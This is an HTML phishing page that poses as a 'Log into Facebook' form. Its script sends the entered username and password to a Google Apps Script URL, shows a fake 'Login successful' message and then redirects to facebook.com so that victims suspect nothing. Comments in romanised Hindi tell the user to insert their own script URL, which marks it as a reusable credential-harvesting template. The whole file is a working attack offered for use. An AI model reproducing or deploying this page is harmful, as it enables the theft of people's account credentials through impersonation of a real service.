<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        body {
            background: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .form-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
        }
        h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 30px;
            text-align: center;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }
        input:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        button {
            width: 100%;
            padding: 15px;
            background: Blue;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 10px;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .success-message {
            text-align: center;
            color: #4CAF50;
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            background: #e8f5e9;
            display: none;
        }
        .error-message {
            text-align: center;
            color: #f44336;
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            background: #ffebee;
            display: none;
        }
    </style>
</head>
<body>
    <div class="form-container">
   	<h2>Log into Facebook</h2>
        <form id="loginForm">
            <div class="input-group">
                <label>Email or Username</label>
                <input type="text" name="username" placeholder="Enter your email or username" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit">Log In</button>
            
            <div class="success-message" id="successMessage">
                ✓ Login successful! Redirecting...
            </div>
            <div class="error-message" id="errorMessage">
                ✗ Something went wrong. Please try again.
            </div>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);
            const successMsg = document.getElementById('successMessage');
            const errorMsg = document.getElementById('errorMessage');
            
            // Hide any previous messages
            successMsg.style.display = 'none';
            errorMsg.style.display = 'none';
            
            // Disable submit button to prevent double submission
            const submitBtn = form.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            
            try {
                // YAHAN APNA GOOGLE APPS SCRIPT URL DALEIN
                const response = await fetch('https://script.google.com/macros/s/AKfycbypBOTU_dZbkEHmNWZVtrQPssYSgwLYJLk_p7pKqn7TsT-CjkuxjR_tqtjYhFD0dEiVWg/exec', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.result === 'success') {
                    successMsg.style.display = 'block';
                    form.reset();
                    
                    // Redirect ya kuch aur 2 second baad
                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com'; // Yahan kisi bhi website ka link daal sakte hain
                    }, 2000);
                } else {
                    throw new Error('Server returned error');
                }
            } catch (error) {
                errorMsg.style.display = 'block';
                console.error('Error:', error);
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log In';
            }
        });
    </script>
</body>
</html>
